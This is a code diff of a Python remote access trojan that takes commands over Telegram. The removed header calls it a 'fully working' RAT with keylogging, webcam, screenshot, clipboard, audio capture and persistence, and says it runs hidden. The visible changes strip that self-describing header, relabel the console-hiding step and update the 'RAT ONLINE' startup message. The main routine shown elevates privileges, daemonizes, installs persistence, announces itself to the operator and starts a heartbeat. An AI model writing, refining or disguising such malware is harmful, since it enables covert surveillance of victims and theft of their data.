@@ -1,9 +1,3 @@
-# rat_fixed_loop.py
-# Fully working cross‑platform RAT with Telegram C2.
-# Fixed main loop: now updates offset correctly, heartbeat does not block.
-# All features: screenshot, webcam, keylogger, clipboard, persistence, wallpaper, audio, run, etc.
-# Auto‑installs dependencies, logs errors, runs hidden.
-
 import os
 import sys
 import time
@@ -68,7 +62,7 @@ def elevate():
             except:
                 pass
 
-# ---------- DAEMONIZE ----------
+# ---------- DAEMONIZE (hide console) ----------
 def daemonize():
     if IS_WINDOWS:
         try:
@@ -1260,7 +1254,7 @@ def get_location():
 
 # ---------- MAIN ----------
 def main():
-    log_error("RAT fixed_loop started")
+    log_error("RAT final fixed started")
     elevate()
     daemonize()
     try:
@@ -1269,7 +1263,7 @@ def main():
     except Exception as e:
         log_error(f"Persistence error: {e}")
     try:
-        tg_send_message(f"🟢 <b>RAT ONLINE (fixed loop)</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nUse /help or inline menu.", reply_markup=main_menu_keyboard())
+        tg_send_message(f"🟢 <b>RAT ONLINE (final fixed)</b> - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nUse /help or inline menu.", reply_markup=main_menu_keyboard())
     except Exception as e:
         log_error(f"Online message error: {e}")
     # Heartbeat thread
